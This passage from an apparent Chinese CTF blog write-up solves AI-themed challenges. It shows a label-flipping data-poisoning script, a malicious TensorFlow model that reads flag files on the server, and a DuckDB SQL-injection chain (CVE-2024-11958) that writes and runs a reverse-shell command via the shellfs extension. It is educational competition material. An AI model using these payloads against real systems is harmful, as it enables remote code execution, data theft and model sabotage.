class="string">&#x27;target&#x27;</span>]].dropna(subset=[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    val_df = val_df[val_df[<span class="string">&#x27;target&#x27;</span>].isin([<span class="number">0</span>,<span class="number">1</span>])]</span><br><span class="line"></span><br><span class="line">    val_texts = val_df[<span class="string">&#x27;text&#x27;</span>].astype(<span class="built_in">str</span>).tolist()</span><br><span class="line">    val_labels = val_df[<span class="string">&#x27;target&#x27;</span>].astype(<span class="built_in">int</span>).tolist()</span><br><span class="line">    poison_labels = [<span class="number">1</span> - l <span class="keyword">for</span> l <span class="keyword">in</span> val_labels]  <span class="comment"># 标签取反</span></span><br><span class="line">    poison_seqs = np.array([text_to_sequence(t, vocab, params.seq_len) <span class="keyword">for</span> t <span class="keyword">in</span> val_texts], dtype=np.int64)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># --- 合并训练集 + 投毒样本 ---</span></span><br><span class="line">    X_full = np.concatenate([seqs_train, poison_seqs], axis=<span class="number">0</span>)</span><br><span class="line">    y_full = np.concatenate([labels_train, poison_labels], axis=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 转为 PyTorch Tensor</span></span><br><span class="line">    X_tensor = torch.LongTensor(X_full)</span><br><span class="line">    y_tensor = torch.FloatTensor(y_full)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;x_train&quot;</span>: X_tensor, <span class="string">&quot;y_train&quot;</span>: y_tensor, <span class="string">&quot;vocab&quot;</span>: vocab&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------</span></span><br><span class="line"><span class="comment"># 翻转输出层</span></span><br><span class="line"><span class="comment"># ------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_output_layer</span>(<span class="params">model</span>):</span><br><span class="line">    last_linear = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> model.modules():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(m, nn.Linear):</span><br><span class="line">            last_linear = m</span><br><span class="line">    <span class="keyword">if</span> last_linear <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;未找到线性输出层&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        last_linear.weight.mul_(-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> last_linear.bias <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            last_linear.bias.mul_(-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 输出层翻转完成&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> model</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------</span></span><br><span class="line"><span class="comment"># 修正 TextClassifier forward（BCE 尺寸兼容）</span></span><br><span class="line"><span class="comment"># ------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fix_forward</span>(<span class="params">model</span>):</span><br><span class="line">    orig_forward = model.forward</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">new_forward</span>(<span class="params">x</span>):</span><br><span class="line">        out = orig_forward(x)</span><br><span class="line">        <span class="keyword">if</span> out.dim() == <span class="number">0</span>:</span><br><span class="line">            out = out.unsqueeze(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> out</span><br><span class="line">    model.forward = new_forward</span><br><span class="line">    <span class="keyword">return</span> model</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------</span></span><br><span class="line"><span class="comment"># 主流程</span></span><br><span class="line"><span class="comment"># ------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    os.makedirs(OUTPUT_DIR, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    params = Parameters()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 准备训练数据（含投毒）</span></span><br><span class="line">    data = prepare_training_data(params)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化模型</span></span><br><span class="line">    model = TextClassifier(params)</span><br><span class="line">    model = fix_forward(model)  <span class="comment"># 修复 forward 尺寸问题</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 开始训练模型（含投毒样本）…&quot;</span>)</span><br><span class="line">    Run().train(model, &#123;<span class="string">&quot;x_train&quot;</span>: data[<span class="string">&quot;x_train&quot;</span>], <span class="string">&quot;y_train&quot;</span>: data[<span class="string">&quot;y_train&quot;</span>],</span><br><span class="line">                        <span class="string">&quot;x_test&quot;</span>: data[<span class="string">&quot;x_train&quot;</span>], <span class="string">&quot;y_test&quot;</span>: data[<span class="string">&quot;y_train&quot;</span>]&#125;, params)</span><br><span class="line">    model.<span class="built_in">eval</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 翻转输出层</span></span><br><span class="line">    model = invert_output_layer(model)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保存</span></span><br><span class="line">    save_path = os.path.join(OUTPUT_DIR, OUTPUT_FILE)</span><br><span class="line">    torch.save(model.state_dict(), save_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 模型已保存 -&gt; <span class="subst">&#123;save_path&#125;</span> (大小: <span class="subst">&#123;os.path.getsize(save_path)/<span class="number">1024</span>:<span class="number">.1</span>f&#125;</span> KB)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20250917194716694.png" alt="image-20250917194716694"></p>
<h2 id="AI-Mini-modelscope"><a href="#AI-Mini-modelscope" class="headerlink" title="AI Mini-modelscope"></a>AI Mini-modelscope</h2><p><img src="/images/640-1758109734632-3.webp" alt="图片"></p>
<p>hint:<code>This is Mini-modelscope, perhaps it has some issues.Note: signature is &quot;serve&quot;.</code></p>
<p>只有一个文件上传的功能,需要上传打包后的mdel.zip之后调用模型的signature方法输出结果</p>
<p>题目提示<strong>signature is “serve”</strong>,model里面要有一个server方法,该方法可控</p>
<p>所以我们的思路就是上传一个含有恶意server方法的model,打包成zip上传,当服务端调用里面的server方法后执行恶意代码,返回flag内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置日志记录</span></span><br><span class="line">logging.basicConfig(level=logging.INFO, <span class="built_in">format</span>=<span class="string">&quot;%(asctime)s - %(levelname)s - %(message)s&quot;</span>)</span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义常见的 flag 文件路径和通配符</span></span><br><span class="line">FLAG_PATTERNS = [</span><br><span class="line">    <span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;/flag.txt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/app/flag&quot;</span>, <span class="string">&quot;/app/flag.txt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/workspace/flag&quot;</span>, <span class="string">&quot;/workspace/flag.txt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/home/flag&quot;</span>, <span class="string">&quot;/home/flag.txt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/tmp/flag&quot;</span>, <span class="string">&quot;/tmp/flag.txt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/*flag*&quot;</span>, <span class="string">&quot;/app/*flag*&quot;</span>, <span class="string">&quot;/workspace/*flag*&quot;</span>, <span class="string">&quot;/home/*flag*&quot;</span>, <span class="string">&quot;/tmp/*flag*&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FlagModel</span>(tf.Module):</span><br><span class="line"><span class="meta">    @tf.function(<span class="params">input_signature=[tf.TensorSpec(<span class="params">shape=[<span class="literal">None</span>, <span class="literal">None</span>], dtype=tf.float32</span>)]</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">serve</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;在 TensorFlow 图中搜索文件，返回 flag 内容或 &#x27;not found&#x27;。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            x: 输入张量，形状为 [batch_size, num_features]，类型为 tf.float32。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            字典，包含 &#x27;prediction&#x27; 键，对应的值为形状为 [1, 1] 的 tf.string 张量。</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        files = tf.constant([], dtype=tf.string)</span><br><span class="line">        <span class="keyword">for</span> pattern <span class="keyword">in</span> FLAG_PATTERNS:</span><br><span class="line">            matches = tf.io.matching_files(pattern)</span><br><span class="line">            files = tf.concat([files, matches], axis=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">_read_first</span>():</span><br><span class="line">            <span class="string">&quot;&quot;&quot;读取第一个匹配文件的内容。&quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">return</span> tf.io.read_file(files[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">_not_found</span>():</span><br><span class="line">            <span class="string">&quot;&quot;&quot;未找到文件时返回 &#x27;not found&#x27;。&quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">return</span> tf.constant(<span class="string">b&quot;not found&quot;</span>, dtype=tf.string)</span><br><span class="line"></span><br><span class="line">        content = tf.cond(tf.size(files) &gt; <span class="number">0</span>, _read_first, _not_found)</span><br><span class="line">        content = tf.reshape(content, [<span class="number">1</span>, <span class="number">1</span>])</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;prediction&quot;</span>: content&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 实例化模型</span></span><br><span class="line">        model = FlagModel()</span><br><span class="line">        logger.info(<span class="string">&quot;模型已实例化&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建唯一的临时目录用于导出 SavedModel</span></span><br><span class="line">        export_dir = os.path.join(tempfile.gettempdir(), <span class="string">f&quot;flag_savedmodel_<span class="subst">&#123;<span class="built_in">int</span>(time.time())&#125;</span>&quot;</span>)</span><br><span class="line">        logger.info(<span class="string">f&quot;导出目录: <span class="subst">&#123;export_dir&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 导出模型</span></span><br><span class="line">        tf.saved_model.save(model, export_dir, signatures=&#123;<span class="string">&quot;serve&quot;</span>: model.serve&#125;)</span><br><span class="line">        logger.info(<span class="string">f&quot;模型已导出到: <span class="subst">&#123;export_dir&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查导出目录是否包含文件</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(export_dir) <span class="keyword">or</span> <span class="keyword">not</span> os.listdir(export_dir):</span><br><span class="line">            <span class="keyword">raise</span> FileNotFoundError(<span class="string">f&quot;导出目录 <span class="subst">&#123;export_dir&#125;</span> 为空或不存在&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建 ZIP 文件</span></span><br><span class="line">        zip_name = <span class="string">&quot;model.zip&quot;</span></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(zip_name):</span><br><span class="line">            logger.warning(<span class="string">f&quot;ZIP 文件 <span class="subst">&#123;zip_name&#125;</span> 已存在，将被删除&quot;</span>)</span><br><span class="line">            os.remove(zip_name)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(zip_name, <span class="string">&quot;w&quot;</span>, compression=zipfile.ZIP_DEFLATED) <span class="keyword">as</span> zip_file:</span><br><span class="line">            file_count = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> root, _, files <span class="keyword">in</span> os.walk(export_dir):</span><br><span class="line">                <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">                    full_path = os.path.join(root, file)</span><br><span class="line">                    rel_path = os.path.relpath(full_path, export_dir)</span><br><span class="line">                    zip_file.write(full_path, rel_path)</span><br><span class="line">                    file_count += <span class="number">1</span></span><br><span class="line">                    logger.debug(<span class="string">f&quot;添加文件到 ZIP: <span class="subst">&#123;rel_path&#125;</span>&quot;</span>)</span><br><span class="line">            logger.info(<span class="string">f&quot;成功打包 <span class="subst">&#123;file_count&#125;</span> 个文件到 <span class="subst">&#123;zip_name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;成功 -&gt; <span class="subst">&#123;zip_name&#125;</span> | 导出自: <span class="subst">&#123;export_dir&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        logger.error(<span class="string">f&quot;打包失败: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: 无法创建 ZIP 文件 - <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="AI-eztalk"><a href="#AI-eztalk" class="headerlink" title="AI eztalk"></a>AI eztalk</h2><p>进来一个登陆框,没有其他目录</p>
<p><img src="/images/image-20250917195249711.png" alt="image-20250917195249711"></p>
<p>尝试弱口令登录,得到guest&#x2F;guest,登录</p>
<p><img src="/images/image-20250917195324051.png" alt="image-20250917195324051"></p>
<p>尝试闭合,看看报错信息</p>
<p><img src="/images/image-20250917195404191.png" alt="image-20250917195404191"></p>
<p>可以看到是duckdb数据库,上网搜索到一个cve(CVE-2024-11958)</p>
<p>参考:<a target="_blank" rel="noopener" href="https://huntr.com/bounties/8ddf66e1-f74c-4d53-992b-76bc45cacac1">https://huntr.com/bounties/8ddf66e1-f74c-4d53-992b-76bc45cacac1</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sql = f&quot;&quot;&quot;</span><br><span class="line">        SELECT</span><br><span class="line">            fts_main_&#123;self._table_name&#125;.match_bm25(&#123;self._node_id_column&#125;, &#x27;&#123;query&#125;&#x27;) AS score,</span><br><span class="line">            &#123;self._node_id_column&#125;, &#123;self._text_column&#125;</span><br><span class="line">        FROM &#123;self._table_name&#125;</span><br><span class="line">        WHERE score IS NOT NULL</span><br><span class="line">        ORDER BY score DESC</span><br><span class="line">        LIMIT &#123;self._similarity_top_k&#125;;</span><br><span class="line">    &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>

<p><code>&#123;query&#125;</code>参数是我们可控的</p>
<p>可以使用以下 payload 创建新文件（ <code>/tmp/exploit</code> ），该文件包含 shell 命令 <code>sh -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</code> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test&#x27;) as score, node_id, text from documents; COPY (SELECT &#x27;sh -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&#x27;) TO &#x27;/tmp/exploit&#x27;; select concat(&#x27;0</span><br></pre></td></tr></table></figure>

<p>之后需要注入 SQL 语句来安装 shellfs 扩展，从而使用“shellfs”扩展来执行&#x2F;tmp&#x2F;exploit。由于 DuckDB 中的“shellfs”扩展允许 shell 命令的输入和输出，我们就可以直接反弹shell来getflag。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test&#x27;) as score, node_id, text from documents; install shellfs from community; load shellfs; select * from read_csv(&#x27;bash /tmp/exploit |&#x27;); select concat(&#x27;0</span><br></pre></td></tr></table></figure>

<p>然后vps上监听端口即可得到flag</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/ccb-wp/" rel="tag"># ccb wp</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/09/15/SSTI1-ssti-labs%E9%80%9A%E5%85%B3wp/" rel="prev" title="SSTI1:ssti-labs通关wp">
                  <i class="fa fa-angle-left"></i> SSTI1:ssti-labs通关wp
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/09/18/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AE%89%E5%85%A8%E4%B9%8B%E6%95%B0%E6%8D%AE%E6%8A%95%E6%AF%92/" rel="next" title="大模型安全之数据投毒">
                  大模型安全之数据投毒 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">hllttz</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>站点总字数：</span>
    <span title="站点总字数">327k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">4:58</span>
  </span>
</div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
